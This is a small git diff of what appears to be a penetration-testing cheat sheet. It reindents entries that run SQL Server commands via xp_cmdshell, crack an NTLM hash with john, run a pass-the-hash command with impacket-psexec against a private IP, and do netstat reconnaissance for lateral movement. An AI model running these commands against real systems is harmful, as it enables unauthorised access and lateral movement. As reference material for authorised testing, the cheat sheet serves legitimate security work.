@@ -265,9 +265,9 @@ gobuster dir -u http://targetIp -w /usr/share/wordlists/dirb/common.txt -b
         EXEC xp_cmdshell whoami -- execute whoami 
 
 ### 11 NTLM Hash
-john hash.txt -- Cracking the hash
---pass the hash
- impacket-psexec -hashes :8846f7eaee8fb117ad06bdd830b7586c  normaluser@192.168.7.129  'ipconfig /all'
+    john hash.txt -- Cracking the hash
+    
+    impacket-psexec -hashes :8846f7eaee8fb117ad06bdd830b7586c  normaluser@192.168.7.129  'ipconfig /all' --pass the hash
 
 ### 11 Recon for Lateral Movement
-netstat -tnlp
+    netstat -tnlp
